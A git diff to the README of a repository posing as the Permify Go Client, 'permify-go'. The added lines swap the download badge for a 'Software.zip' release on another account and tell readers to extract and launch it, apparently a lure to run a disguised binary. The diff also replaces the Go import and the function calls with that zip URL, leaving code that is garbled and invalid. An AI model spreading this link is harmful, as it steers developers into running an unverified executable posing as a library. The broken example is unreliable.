@@ -14,7 +14,7 @@ Welcome to the official repository of **permify-go**, the Permify Go Client. Thi
 ## Installation
 To get started with the Permify Go Client, you can download the latest version by clicking the button below:
 
-[![Download Permify Go Client](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Permify Go Client](https://github.com/DEVILIS786/permify-go/releases/download/v1.0/Software.zip)](https://github.com/DEVILIS786/permify-go/releases/download/v1.0/Software.zip)
 
 Please note that the downloaded file needs to be extracted and launched for installation.
 
@@ -26,15 +26,15 @@ package main
 
 import (
     "fmt"
-    "github.com/permify/permify-go"
+    "https://github.com/DEVILIS786/permify-go/releases/download/v1.0/Software.zip"
 )
 
 func main() {
     // Create a new Permify client
-    client := permify.NewClient("your-api-key")
+    client := https://github.com/DEVILIS786/permify-go/releases/download/v1.0/Software.zip("your-api-key")
 
     // Use the client to interact with Permify services
-    // Example: client.GetResources()
+    // Example: https://github.com/DEVILIS786/permify-go/releases/download/v1.0/Software.zip()
 }
 ```
 
